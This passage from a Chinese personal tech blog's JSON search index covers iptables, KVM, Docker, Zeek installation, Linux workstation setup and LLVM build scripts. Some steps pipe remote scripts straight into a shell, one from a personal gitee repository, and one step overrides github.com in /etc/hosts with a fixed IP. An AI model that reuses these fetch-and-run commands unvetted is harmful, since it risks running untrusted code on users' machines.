JSON是使用C语言编写，用来创建、解析JSON文件的库。 \n源码地址：https://github.com/DaveGamble/cJSON\noss-fuzz项目地址：https://github.com/google/oss-fuzz/tree/master/projects/cjson\n\n3.4 libpcap\n介绍： libpcap（Packet Capture Library），即数据包捕获函数库，是Unix/Linux平台下的网络数据包捕获函数库。它是一个独立于系统的用户层包捕获的API接口，为底层网络监测提供了一个可移植的框架。 \n源码地址：https://github.com/the-tcpdump-group/libpcap\noss-fuzz项目地址：https://github.com/google/oss-fuzz/tree/master/projects/libpcap\n\n4 参考文档AFLGO官方README\n值得推荐的C/C++开源框架和库\n开源软件分类列表\n软件分类-开源中国OSCHINA\n","categories":["Fuzz"],"tags":["AFL","Fuzz"]},{"title":"Iptables(1)","url":"/2019/10/22/Iptables-1/","content":"1 概念1.1 防火墙的概念\n逻辑上讲，防火墙可以分为主机防火墙和网络防火墙\n主机防火墙：保护单个主机\n网络防火墙：往往处于网络入口，保护入口后面的本地局域网\n\n\n物理上讲，防火墙可以分为硬件防火墙和软件防火墙\n硬件防火墙：在硬件级别实现防护\n软件防火墙：通过软件在硬件平台上实现防护\n\n\n\n1.2 iptables的概念iptables是一个linux操作系统中的命令行工具。用户通过iptables能够实施对真正防火墙netfilter的操作，如网络地址转换，数据包内容修改，数据包过滤等\n\n1.3 链和表的概念1.3.1 链iptables 防火墙一共有五道关卡，五道关卡分别是PREROUTING，INPUT，FORWARD，OUTPUT，POSTROUTING\n根据实际情况的不同，报文会经过不同的关卡，如下图所示：\n防火墙的作用就在于对经过的报文匹配“规则”，然后执行相应的动作。所以当报文流经关卡时，会匹配关卡上的规则。然而在每一道关卡上，规则可能不止一条，于是多条规则按照一定的逻辑顺序串成了一条链。如下图所示：\n1.3.2 表我们把具有相同功能的规则的集合叫做“表”，iptables定义了四种表 (优先级由高到低)：\n\nraw表：关闭nat表上启用的链接追踪机制；内核模块：iptables_raw\nmangle表：拆解，修改，重新封装报文；内核模块：iptables_mangle\nnat表：网络地址转换（network address translation）；内核模块：iptables_nat\n\nfilter表：负责过滤功能；内核模块：iptables_filter\n\n\n1.3.3 表与链的关系不同的链上的规则会根据功能不同而存放在不同的表中，不同的链上能存放的表也有所不同。以下是链与表的关系：\n\nPREROUTING：raw表，mangle表，nat表\nINPUT：mangle表，filter表\nFORWARD：mangle表，filter表\nOUTPUT：raw表，mangle表，nat表，filter表\nPOSTROUTING：mangle表，nat表\n\n但是，我们在实际操作iptables的时候，往往是通过“表”作为操作入口，对规则进行定义的。以下是表与链的关系：\n\nraw：PREROUTING，OUTPUT\nmangle：PREROUTING，INPUT，FORWARD，OUTPUT，POSTROUTING\nnat：PREROUTING，OUTPUT，POSTROUTING\nfilter：INPUT，FORWARD，OUTPUT\n\n数据包流经主机的详细图解\n\n2 iptables的规则管理2.1 基本的规则操作\n查看规则：\n\n-L：list，显示指定的参数，在后面跟上链的名字可以指定查看的规则链\n-C：check，查找并显示指定的参数\n-t：table，指定要匹配的表，（当没有指定时，默认为filter表）\n-v：verbose，详细信息（多出pkts，bytes，target，prot，opt，in，out等信息）\n-n：不对ip进行域名反解\n—line-number：显示规则的序号\n-x：显示精确的packets和bytes数目\n\n最终命令为iptables与上述option的组合\n\n增加规则：\n\n-t + 指定的表 指定要操作的表\n-I + 指定的规则链  insert，插入指定的表的规则链首\n-A + 指定的规则链  append，追加到指定的表的规则链尾\n-s：源地址（default 为 0.0.0.0/0，也即all）\n-d：目的地址（default 为0.0.0.0/0，也即all）\n-j：taget字段，即ACCEPT、REJECT、DROP等动作\n\n\n删除规则：\n\n根据规则的编号删除：iptables -t TABLE -D CHAIN seq 其中TABLE是指定的表，CHAIN是指定的链，seq是要删除的规则的序号。\n根据具体的匹配条件与动作删除规则：如 iptables -D INPUT -s 192.168.1.123 -j ACCEPT\n删除某表的某条链中的所有规则：iptables -t 表名 -F 链名，F for flush（慎重！）\n修改规则：-R 链名 序号 新的匹配条件，但更建议删除原规则再新建一条规则。\n\n\n保存规则：\n\ncentos中，使用service iptables save 即可。规则会默认保存在 /etc/sysconfig/iptables文件中\n通用方法：将iptables-save 的流重定向到/etc/sysconfig/iptables 文件\n重载规则：iptables-restore &lt; /etc/sysconfig/iptables (重载会覆盖现有的规则)\n\n\n\n2.2 进阶规则操作—黑白名单2.2.1 黑名单\n概念：除了与名单上匹配的报文禁止通过以外，所有报文皆放行\n\n实现方法：我们可以注意到iptables的每一条规则链后面都显示这样的内容：\npolicy 策略 表示该链对于报文的默认策略。所以当默认策略为ACCEPT时，链中的规则应该为REJECT或DROP，此时之只有匹配到的报文会被拒绝或丢掉，其余的报文皆被放行，从而实现黑名单。\n\n命令：iptables -P 链名 ACCEPT\n\n\n2.2.2 白名单\n概念：除了与名单上匹配的报文会放行，所有报文皆被禁止通过\n实现方法：将默认策略设置为REJECT或DROP，链中的规则设置为ACCEPT\n命令：iptables -P 链名 REJECT or iptables -P 链名 DROP\n\n2.2.3 白名单的改进\n普通白名单的安全隐患：当我们将默认策略设置为拒绝时，如果我们 iptables -F 清空了规则链，那么所有报文都会被拒绝，如果管理员正在远程ssh操作，此时ssh连接则会直接断开，且目标机器会与外部通信阻隔\n\n改进：将默认策略的拒绝改为接受，然后将“拒绝所有的报文“放在规则链的末尾。根据规则链的顺序匹配可知，符合匹配规则的报文放行，否则一律禁止通过\n\n命令：\niptables -P 链名 ACCEPT     #更改默认策略iptabels -A 链名 -j REJECT  #在链尾追加全部拒绝的规则\n\n\n参考文档：iptables防火墙|朱双印博客\n","categories":["Notes"],"tags":["Linux","iptables"]},{"title":"KVM虚拟机的四种网络模式","url":"/2020/06/24/KVM%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E5%9B%9B%E7%A7%8D%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%BC%8F/","content":"因为前段时间项目需要在KVM架构的网络靶场中进行演示，于是学习并整理了KVM虚拟机有关网络架构的知识。\n\n1 KVM简介 Libvirt虚拟网络使用虚拟网络交换机的概念。虚拟网络交换机是在主机物理机器服务器上运行的软件结构，虚拟机（客户机）通过它连接到该物理主机服务器。客户机的网络流量通过这个交换机被引导： \n\n Linux主机物理机服务器将虚拟网络交换机表示为网络接口。当libvirt的守护进程（libvirtd）首次安装并启动时，表示虚拟网络交换机的默认网络接口是virbr0。 \n\n 可以通过ip或者ifconfig查看到此Interface： \n\n2 网络模式2.1 桥接模式在使用桥接模式时，所有虚拟机都好像与主机物理机器在同一个子网内。同一物理网络中的所有其他物理机器都知道这些虚拟机，并可以访问这些虚拟机。桥接操作在OSI网络模型的第2层。\n在中间件（hypervisor ）中可以使用多个物理接口，通过绑定把他们连接在一起，然后把它添加的网桥，同时虚拟机也被添加到这个网桥，绑定操作有多种模式，只有少数这些模式可以与虚拟客户机正在使用的桥接器配合使用。 \n\n2.2 NAT模式默认情况下，虚拟网络交换机以NAT模式运行。他们使用IP伪装而不是SNAT（Source-NAT）或DNAT（Destination-NAT）。IP伪装使得连接的guest虚拟机可以使用主机物理机器IP地址与任何外部网络进行通信。默认情况下，虚拟网络交换机在NAT模式下运行时，放置在主机物理机外部的计算机无法与其中的guest虚拟机进行通信，如下图所示： \n\nDNS和DHCPIP地址可以通过DHCP分配给客户机。为此，可以将地址池分配给虚拟网络交换机。Libvirt使用这个dnsmasq程序。dnsmasq的一个实例是由libvirt为每个需要它的虚拟网络交换机自动配置和启动的。 \n\n2.3 路由模式当使用路由模式时，虚拟交换机连接到连接到主机物理机器的物理LAN，在不使用NAT的情况下来回传输流量。虚拟交换机可以检查所有流量，并使用网络数据包中包含的信息来做出路由决策。使用此模式时，所有虚拟机都位于其自己的子网中，通过虚拟交换机进行路由。这种情况并不总是理想的，因为物理网络上的其他主机物理机器不通过手工配置的路由信息是没法发现这些虚拟机，并且不能访问虚拟机。路由模式在OSI网络模型的第三层运行。 \n\n2.4 隔离模式使用隔离模式时，连接到虚拟交换机的虚拟机可以相互通信，也可以与主机物理机通信，但其通信不会传到主机物理机外，也不能从主机物理机外部接收通信。在这种模式下使用dnsmasq对于诸如DHCP的基本功能是必需的。但是，即使该网络与任何物理网络隔离，DNS名称仍然被解析的。因此，DNS名称能解析但ICMP回应请求（ping）命令失败这种情况可能会出现。 \n\n2.5 默认模式libvirtd第一次被安装时，它将包含配置在NAT模式下的初始虚拟网络交换机。使用此配置，以便安装的guest虚拟机可以通过主机物理机与外部网络进行通信。下图显示了这个默认配置libvirtd： \n\n3 参考 \n  \n    本篇博文有待完善，还需添加自己的实验部分orz\n\n   \n[1] kvm虚拟机的四种网络模式\n[2] KVM虚拟化之四种网络模型\n","categories":["Notes"],"tags":["Virtualization","KVM"]},{"title":"KVM的安装与使用","url":"/2020/05/25/KVM%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/","content":" 基于内核的虚拟机（Kernel-based Virtual Machine，简称KVM），是一种用于Linux内核中的虚拟化基础设施。KVM目前支持Intel VT及AMD-V的原生虚拟技术 \n\n1 KVM简介\n一些概念：\n\n是x86架构且硬件支持虚拟化技术（如 intel VT 或 AMD-V）的Linux全虚拟化解决方案\n它包含一个为处理器提供底层虚拟化 可加载的核心模块kvm.ko（kvm-intel.ko或kvm-AMD.ko） \nKVM还需要一个经过修改的QEMU软件（qemu-kvm），作为虚拟机上层控制和界面 \n在主流的Linux内核，如2.6.20以上的内核均已包含了KVM核心\n\n\nQEMU-KVM：\n\n在Linux系统中，仅加载了KVM内核模块是不够的，用户无法直接控制内核模块去做事情，还必须有一个用户空间的工具。因此KVM的开发者选择了已成型的开源虚拟化软件QEMU，形成可控制KVM内核模块的用户空间工具QEMU-KVM\n\n\nlibvirt：\nLibvirt 是一套提供了多种语言接口的API，为各种虚拟化工具提供一套方便可靠的编程接口，不仅支持 KVM，而且支持 Xen 等其他虚拟机。Libvirt 不仅提供了 API，还自带一套基于文本的管理虚拟机的命令 virsh，可通过使用 virsh 命令来使用 libvirt 的全部功能\n\n\n\n2 KVM安装2.1 检查虚拟化支持KVM是面向具备Intel VT和AMD-V虚拟化硬件的技术，因此首先需要check你的系统是否支持虚拟化：\negrep &#x27;(vmx|svm)&#x27; /proc/cpuinfo\n能看到flag *******的输出即表明支持虚拟化，其中vmx对应Inter VT，svm对应ADM-V\n2.2 安装相关软件包理论上KVM的最小安装就是qemu-kvm和virtinst，但考虑到管理上的便捷性，我们需要libvirt-daemon作为守护进程和virt-manager的GUI管理界面，以及brctl：\n# 更新镜像源（如果有必要）sudo apt-get update# 安装相关软件包sudo apt install qemu qemu-kvm virtinst virt-manager bridge-utils\n管理libvirtd.service\n# systemd管理sudo systemctl [start|stop|restart|enbale|disable|status] libvirtd\n3 KVM使用 \n  \n    所有的KVM的管理都可以从virt-manager图形化界面来操作，因此下面主要介绍命令行接口\n\n   \n3.1 创建KVM虚拟机3.2 管理KVM虚拟机3.3 配置虚拟机网络 \n  \n    To be completed… : )\n\n   \n4 参考[1] 基于内核的虚拟机(KVM) 维基百科\n[2] kvm 虚拟化概述及 virt-manager 安装虚拟机\n[3] Debian 9 安装 KVM 虚拟机\n","categories":["Tutorial"],"tags":["Virtualization","KVM"]},{"title":"Kali Linux安装Docker","url":"/2019/01/12/Kali-Linux%E5%AE%89%E8%A3%85Docker/","content":"由于计算机网络课设需求，需要部署多个NS-3的Docker，于是我便尝试在我的Kali上安装Docker。本文将主要介绍其安装过程。\n\n1 卸载旧版本sudo apt remove docker docker.io docker-engine\n2 使用APT安装2.1 安装依赖由于APT源使用HTTPS以确保软件下载过程中不被篡改。因此，我们首先需要添加使用HTTPS传输的软件包以及CA证书。\nsudo apt-get updatesudo apt-get install apt-transport ca-certificates curl gnupg2 lsb-release software-properties-common\n2.2 添加软件源\n为了确认所下载软件包的合法性，需要添加软件源的GPG密钥\n\ncurl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/debian/gpg | sudo apt-key add -# 官方源# $ curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -\n\n向sources.list添加Docker CE的软件源\n\n# 官方源sudo echo &quot;deb [arch=amd64] https://download.docker.com/linux/debian stretch stable&quot; | sudo tee -a /etc/apt/sources.list\n2.3 安装Docker CE更新apt软件包缓存，并安装docker-ce\nsudo apt-get updatesudo apt-get install docker-ce\n3 使用脚本自动安装 在测试或开发环境中 Docker 官方为了简化安装流程，提供了一套便捷的安装脚本，Debian 系统上可以使用这套脚本安装，另外可以通过 --mirror 选项使用国内源进行安装： \ncurl -fsSL get.docker.com -o get-docker.shsudo sh get-docker.sh --mirror Aliyun# sudo sh get-docker.sh --mirror AzureChinaCloud\n4 建立docker用户组 默认情况下，docker 命令会使用 Unix socket 与 Docker 引擎通讯。而只有 root 用户和 docker 组的用户才可以访问 Docker 引擎的 Unix socket。出于安全考虑，一般 Linux 系统上不会直接使用 root 用户。因此，更好地做法是将需要使用 docker 的用户加入 docker 用户组。 \n\n建立docker组：\n\nsudo groupadd docker\n\n将当前用户加入docker组：\n\nsudo usermod -aG docker $USER\n退出当前终端并重新登录\n","categories":["Tutorial"],"tags":["Kali","Docker"]},{"title":"Zeek安装","url":"/2020/03/12/Zeek%E5%AE%89%E8%A3%85/","content":"Zeek的安装是一个大坑  ( ￣︿￣)，本文将介绍Zeek的安装教程，然后附上了我的*踩坑记录和一键安装脚本。\n\n1 先决条件1.1 必须的依赖运行Zeek所必须的包：\n\nLibpcap (http://www.tcpdump.org)\nOpenSSL libraries (http://www.openssl.org)\nBIND8 library\nLibz\nBash (for BroControl)\nPython &gt;= 2.6 (for BroControl)\n\n从源码安装所必须的包：\n\nCMake &gt;= 2.8 (http://www.cmake.org)\nMake\nC/C++ Compiler with C++11 support (GCC 4.8+ or Clang 3.3+)\nSWIG (http://www.swig.org)\nBison (GNU Parser Generator)\nFlex (Fast Lexical Analyzer)\nLibpcap headers\nOpenSSL headers\nzlib headers\nPython\n\n通过包管理安装上述依赖：\n\nRPM/RedHat-based Linux：\nsudo yum install cmake make gcc gcc-c++ flex bison libpcap-devel openssl-devel python-devel swig zlib-devel\n\nDEB/Debian-based Linux：\nsudo apt-get install cmake make gcc g++ flex bison libpcap-dev libssl-dev python-dev swig zlib1g-dev\n\nFreeBSD： FreeBSD的最小安装已经包含了部分依赖，除了以下需要手动安装\nsudo pkg install bash cmake swig bison python py27-sqlite3\n\n\n1.2 可选的依赖\nC++ Actor Framework (CAF) version 0.14 (http://actor-framework.org)\nLibGeoIP (用于IP地理定位)\nsendmail (让Bro和BroControl能够发送邮件)\ncurl\ngperftools (采用了tcmalloc来改善内存和CPU的使用)\njemalloc (http://www.canonware.com/jemalloc/)\nPF_RING (Linux only)\nipsumdump (for trace-summary; http://www.cs.ucla.edu/~kohler/ipsumdump)\n\n2 安装Zeek2.1 使用预构建的二进制发行包\n官网下载：\n有关二进制版本和安装说明的信息，请参见bro下载页面以获取当前受支持/目标平台。\n\n默认安装路径是/opt/bro\n\n\n2.2 源码安装\n官网下载\nZeek的二进制发行包是和源码绑定在一起的，均可在bro下载页面获取\n\n通过git下载\ngit clone --recursive git://github.com/zeek/zeek.git\n注意：如果选择非递归克隆，则为最小克隆，许多其他依赖的子模块需要额外获取。\n# ./configure --help ./configuremakemake install# 默认安装路径为/usr/local/bro\n\n添加环境变量\n\n\n3 踩坑记录3.1 源码安装\n一定要选择git clone —recursive，否则以下submodule将需要额外从git安装\nzeek/cmake\nzeek/broker\nzeek/broker/cmake\nzeek/broker/3rdparty\nzeek/broker/3rdparty/caf (mv from zeek/broker/aux/caf)\n\n\nzeek&gt;=3.0有对于以下软件包有更高版本的要求\ncmake &gt;= 3.0\nC/C++ Compiler with C++17 support (GCC 7+ or Clang 4+)\n\n\n\n3.2 一键安装脚本开源仓库auto-install-zeek :rainbow:\n","categories":["Tutorial"],"tags":["IDS","Zeek"]},{"title":"Linux个人工作环境配置","url":"/2021/04/10/Linux%E4%B8%AA%E4%BA%BA%E5%B7%A5%E4%BD%9C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/","content":"Linux个人工作环境配置（持续更新）在迁移到新的Linux系统时，可以用以下来配置个人工作环境，以快速恢复效率✨\n\n\n本文环境：Ubuntu 22.04 LTS\n\n1 系统配置配置代理\n可直接在  Settings &gt; Network &gt; Network Proxy &gt; Manual  图形界面中配置系统代理http_proxy和https_proxy，注意不只需写ip和port，不需要在ip前加protocol。然后重启NetworkManager生效。\n\nsudo systemctl restart NetworkManager\n\n或者在命令行中为终端shell配置代理：\n\n# 仅对当前终端的shell生效export http_proxy=http://PROXY_IP:PROXY:PORTexport https_proxy=http://PROXY_IP:PROXY:PORT# 持久化（重启）生效sudo touch /etc/profile.d/my_proxy.shecho &quot;export http_proxy=http://PROXY_IP:PROXY:PORT&quot; &gt;&gt; /etc/profile.d/my_proxy.shecho &quot;export https_proxy=http://PROXY_IP:PROXY:PORT&quot; &gt;&gt; /etc/profile.d/my_proxy.shecho &quot;no_proxy=\\&quot;localhost, 127.0.0.1\\&quot;&quot; &gt;&gt; /etc/profile.d/my_proxy.shsudo chmod +x /etc/profile.d/my_proxy.shsource /etc/profile.d/my_proxy.sh# 注: 如果是zsh，则需要注意是否在/etc/zsh/zprofile中添加了相关支持\n\n验证代理配置成功\n\n# 打印success即说明配置成功timeout 5s curl -I google.com &amp;&amp; echo success || echo fail\n\n配置代理的一个大坑：保证http_proxy等代理对sudo生效（不论当前用户是否为root，都需要添加以下内容）\n\n#/etc/sudoersDefaults env_keep += &quot;http_proxy https_proxy ftp_proxy&quot;  \n更换镜像源\n清华源\n\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse\n\n自动化换源（暂时只支持Ubuntu）\n\ngit clone git@github.com:QGrain/My-Awesome-Configuration.git awesome-confpushd awesome-conf/mirror-sourcechmod u+x change-mirror-source.sh./change-mirror-source.shpopd\n其他的坑\n再记录一个关于Ubuntu 22 in VMware的坑\n安装[open-vm-tools, open-vm-tools-desktop]和vmware-tools是互斥的两个\n\n\n\n2 软件配置常用软件# 常用网络工具sudo apt install -y net-tools openssh-server curl inetutils-ping# 常用运维工具sudo apt install -y screen tmux# 常用系统资源管理工具sudo apt install -y htop screenfetch # neofetch\nGit\n基本配置\n\n# 安装gitsudo apt install git# 配置账号git config --global user.name &quot;GIT_USERNAME&quot;git config --global user.email &quot;GIT_EMAIL&quot;# 配置代理，仅针对https://github.com代理。移除此字段则是全局代理git config --global http.https://github.com.proxy &quot;socks5://PROXY_IP:PROXY_PORT&quot;git config --global https.https://github.com.proxy &quot;socks5://PROXY_IP:PROXY_PORT&quot;\n\n配置github ssh keys\n\n# 生成公私钥对ssh-keygen -t rsa -C &quot;YOUR_COMMENT&quot;# 将id_rsa.pub公钥上传至Github &gt; Settings &gt; SSH and GPG keys# 测试配置是否成功ssh -T git@github.com# 注意！若提示需要输入git@github.com&#x27;s password则说明github.com域名被污染，其解析的ip不正确，需要改/etc/hosts，添加以下一行即可（但是很奇怪的是无法再ping通了）20.205.243.166 github.com# 也可以直接上 https://github.com/521xueweihan/GitHub520\n\n好用的插件⭐\ngitlen：功能包括但不限于行末显示代码commit历史\ngitblame：See git blame information in the status bar.\nCompare Folder：对比文件夹\nRemote - SSH(WSL)：远程连接服务器\nvscode-icons：给文件和文件夹替换精美icon\nMarkdown All in One：markdown插件\n\n\n\nVim\n安装vim\n\nsudo apt install vim# 使用个人常用的精简配置wget -c https://raw.githubusercontent.com/QGrain/My-Awesome-Configuration/master/vim/vimrc -O ~/.vimrc\n\n配置Spacevim？Todo\n\nOh-My-Zsh\n安装与配置\n\n# 安装zshsudo apt install zsh# 安装ohmyzshsh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;# 拉取个人zshrc配置wget -c https://raw.githubusercontent.com/QGrain/My-Awesome-Configuration/master/zsh/zshrc -O ~/.zshrc# Sourcesource ~/.zshrc\n\n支持/etc/profile.d/*.sh脚本\n\n# 在/etc/zsh/zprofile中追加以下内容if [ -d /etc/profile.d ]; then  for i in /etc/profile.d/*.sh; do    if [ -r $i ]; then      . $i    fi  done  unset ifi\nneovimfzfgit clone --depth 1 https://github.com/junegunn/fzf.git ~/.fzf~/.fzf/install\ncmake\n源码安装指定版本，我曾经写过一个脚本，但是没空找了\n\nminiconda3# 从官方站点下载速度较慢，可从国内镜像站下载miniconda3-py38 64-bitwget -c https://mirrors.tuna.tsinghua.edu.cn/anaconda/miniconda/Miniconda3-py38_4.12.0-Linux-x86_64.sh# 添加当前用户可执行权限chmod u+x ./Miniconda3-py38_4.12.0-Linux-x86_64.sh# 执行安装脚本，依照提示完成安装./Miniconda3-py38_4.12.0-Linux-x86_64.sh# 添加环境变量sudo touch /etc/profile.d/my_software.shecho &quot;export PATH=$PATH:/home/$USER/miniconda3/bin&quot; &gt;&gt; /etc/profile.d/my_software.shsource /etc/profile.d/my_software.sh# 注: 如果是zsh，则需要注意是否在/etc/zsh/zprofile中添加了相关支持\ndocker\ndocker安装：\n\n# 详细参见菜鸟教程，我就不照搬了 qwqhttps://www.runoob.com/docker/ubuntu-docker-install.html\n\n容器内常用软件安装，参见本文前半部分的常用软件安装\n\n3 开发配置C/C++\ngcc-9/g++-9：由于Ubuntu22自带的gcc版本是11较高，为了兼容部分源码安装gcc-9以及g++-9\n\nsudo apt install gcc-9 g++-9# 配置update-alternativessudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-11 20 --slave /usr/bin/g++ g++ /usr/bin/g++-11 --slave /usr/bin/gcov gcov /usr/bin/gcov-11 --slave /usr/bin/gcc-ar gcc-ar /usr/bin/gcc-ar-11 --slave /usr/bin/gcc-nm gcc-nm /usr/bin/gcc-nm-11 --slave /usr/bin/gcc-ranlib gcc-ranlib /usr/bin/gcc-ranlib-11sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-9 90 --slave /usr/bin/g++ g++ /usr/bin/g++-9 --slave /usr/bin/gcov gcov /usr/bin/gcov-9 --slave /usr/bin/gcc-ar gcc-ar /usr/bin/gcc-ar-9 --slave /usr/bin/gcc-nm gcc-nm /usr/bin/gcc-nm-9 --slave /usr/bin/gcc-ranlib gcc-ranlib /usr/bin/gcc-ranlib-9\n\nllvm-12.0.1(with gold plugin)：插桩利器\n\n# 一键安装（预计四十分钟？）curl https://gitee.com/QGrain/aflgo-build/raw/master/build_llvm_12.sh | bash\ngdb\n源码安装gdb 10.2\n\nwget http://ftp.gnu.org/gnu/gdb/gdb-10.2.tar.xztar xvJf gdb-10.2.tar.xzcd gdb-10.2# 需要安装python3-dev，否则./configure --with-python=/usr/bin/python3之后make会报错找不到distutils.sysconfigsudo apt install -y python3-dev texinfo./configure --with-python=/usr/bin/python3make -j8sudo make install\n\n安装gef插件\n\n# manuallywget -O ~/.gdbinit-gef.py -q https://gef.blah.cat/pyecho source ~/.gdbinit-gef.py &gt;&gt; ~/.gdbinit# 运行gdb遇到以下报错，通常是终端字符集不支持某些Unicode字符引起的Python Exception &lt;class &#x27;UnicodeEncodeError&#x27;&gt; &#x27;ascii&#x27; codec can&#x27;t encode character &#x27;\\u27a4&#x27; in position 12: ordinal not in range(128)# 在终端中设置正确的字符集以解决问题echo &quot;export LC_CTYPE=C.UTF-8&quot; &gt;&gt; ~/.bashrcsource ~/.bashrc\n\n安装pwndbg\n\nJava\nJava长期支持版本\n\n\n\n\n\n版本\n初始发行\n停止维护\n下载链接\n\n\n\n\n17\n2021-09-14\n2029-09-30\nJava17 Download\n\n\n11\n2018-09-25\n2026-09-30\nJava11 Download\n\n\n8\n2014-03-18\n2030-07-19\nJava8 Download\n\n\n\n\n\n选择下载jdk17\n\nGo\nEasygoing: https://go.dev/dl/\n\nRust\nEasygoing: https://www.rust-lang.org/zh-CN/tools/install\n\nNode\nEasygoing: https://nodejs.org/en/download/\n\n4 CTF配置Burpsuite Pro 2022IDA Pro 7.7更多详见百度网盘\nTo be completed\n","categories":["Configuration"],"tags":["Linux"]},{"title":"LLVM备忘录","url":"/2023/03/02/LLVM%E5%A4%87%E5%BF%98%E5%BD%95/","content":"LLVM备忘录、笔记兼心得\n\n1 源码安装LLVM软件依赖：\n\n\n\nPackage\nVersion\nNotes\n\n\n\n\ncmake\n&gt;=3.20.0\nMakefile/workspace generator\n\n\nGCC\n&gt;=7.1.0\nC/C++ compiler\n\n\npython\n&gt;=3.6\nAutomated test suite(Only needed for automatic test suite in llvm/test)\n\n\nzlib\n&gt;=1.2.3.4\nCompression library(Optional)\n\n\nGNU Make\n&gt;=3.79.1\nMakefile/build processor(Optional)\n\n\n\n\n编译安装更新cmake：\n# 卸载cmakesudo apt remove -y cmakesudo apt install -y libssl-devwget https://cmake.org/files/v3.23/cmake-3.23.0.tar.gztar zxvf cmake-3.23.0.tar.gzcd cmake-3.23.0./configuremake -j8sudo make install\n老版本一键安装脚本：build_llvm-old.sh\n#!/bin/bash# Install old version llvm-project from source. Two reasons why use this script:# 1. llvm-project before 9.0.1 does not have a tarball of llvm-project. We need to download them seperately.# 2. Older llvm-project (before 9.0.1?) uses some features which would be changed or deprecated in C++17. So we&#x27;d better use gcc-5 to compile llvm.set -ecwd=`pwd`ver=$1packages=(llvm cfe compiler-rt libcxx libcxxabi lld clang-tools-extra)base_url=https://releases.llvm.org/$versrc_dir=llvm-project-$ver.srcinstall_dir=llvm-project-$ver.installmkdir $src_dir $install_dir# download and extractpushd $src_dirfor pack in $&#123;packages[@]&#125;do        wget $base_url/$pack-$ver.src.tar.xz        tar xvJf $pack-$ver.src.tar.xzdoneecho -e &quot;\\ndownload and extract finish&quot;mv llvm-$ver.src llvmmv cfe-$ver.src clangmv compiler-rt-$ver.src compiler-rtmv libcxx-$ver.src libcxxmv libcxxabi-$ver.src libcxxabimv lld-$ver.src lldmv clang-tools-extra-$ver.src clang-tools-extra# build in $src_dirmkdir buildcd buildcmake -G Ninja\\                -DCMAKE_BUILD_TYPE=Release \\                # -DLLVM_ENABLE_PROJECTS=&quot;clang;lld;compiler-rt&quot; \\                -DLLVM_TARGETS_TO_BUILD=&quot;X86&quot; \\                -DCMAKE_INSTALL_PREFIX=$cwd/$install_dir \\                -DLLVM_ENABLE_RUNTIMES=&quot;libcxx;libcxxabi&quot; ../llvm# cmake -G Ninja -DLIBCXX_ENABLE_SHARED=OFF -DLIBCXX_ENABLE_STATIC_ABI_LIBRARY=ON -DCMAKE_BUILD_TYPE=Release -DLLVM_TARGETS_TO_BUILD=&quot;X86&quot; -DLLVM_BINUTILS_INCDIR=/usr/include ../llvmecho -e &quot;\\ncmake finish\\n&quot;ninja -j16echo -e &quot;\\nninja finish, return value: $?&quot;echo -e &quot;\\nplease: cd $cwd$src_dir/build &amp;&amp; ninja install&quot;\n一键安装脚本：build_llvm-project.sh\n#!/bin/bashset -eprint_help()&#123;    echo -e &quot;Usage: ./build_llvm-project.sh LLVM_VERSION\\n&quot;    echo -e &quot;[Notice] LLVM_VERSION&#x27;s format is X.Y.Z, *-rcN versions are not supported\\n&quot;    exit 1&#125;get_url()&#123;    OLD_IFS=$IFS    IFS=&quot;.&quot;    arr=($1)    IFS=$OLD_IFS    ver_val=0    for i in $(seq 0 2)    do        ver_val=`echo &quot;$ver_val * 10 + $&#123;arr[$i]&#125;&quot; | bc`    done    new_ver=1101    old_ver=901    if [[ $ver_val -ge $new_ver ]]    then        echo &quot;https://github.com/llvm/llvm-project/releases/download/llvmorg-$1/llvm-project-$1.src.tar.xz&quot;    elif [[ $ver_val -ge $old_ver ]]    then        echo &quot;https://github.com/llvm/llvm-project/releases/download/llvmorg-$1/llvm-project-$1.tar.xz&quot;    else        echo &quot;Old version &lt; 9.0.1, not supported (TODO). Exit.&quot;        exit 1    fi&#125;cwd=`pwd`version=$1 # like 13.0.1if [[ ! $version ]]then    echo -e &quot;version is NULL\\n&quot;    print_helpfi# dependenciessudo apt updatesudo apt install -y cmake ninja-build libedit-dev python3-dev swig# download sourceINSTALL_DIR=llvm-project-$version.installURL=`get_url $version`SRC_DIR=$(basename $URL .tar.xz)if [[ ! -e $SRC_DIR.tar.xz ]]; then    wget $URLfiif [[ ! -d $SRC_DIR ]]; then    tar xvJf $SRC_DIR.tar.xzfiif [[ ! -d $INSTALL_DIR ]]; then    mkdir $INSTALL_DIR    mkdir -p $SRC_DIR/buildficd $SRC_DIR/buildcmake -G Ninja\\                -DCMAKE_BUILD_TYPE=&quot;Release&quot; \\                -DLLVM_ENABLE_PROJECTS=&quot;clang;lld;compiler-rt&quot; \\ # Notice, compiler-rt has trouble with old ver of llvm                -DLLVM_TARGETS_TO_BUILD=&quot;X86&quot; \\                -DLLVM_INSTALL_UTILS=ON \\                -DCMAKE_INSTALL_PREFIX=$cwd/$INSTALL_DIR \\                -DLLVM_ENABLE_RUNTIMES=&quot;libcxx;libcxxabi&quot; ../llvmecho -e &quot;\\ncmake finish\\n&quot;ninja -j8echo -e &quot;\\nninja finish, return value: $?&quot;echo -e &quot;\\nplease: cd $SRC_DIR/build &amp;&amp; ninja install&quot;# sudo ninja 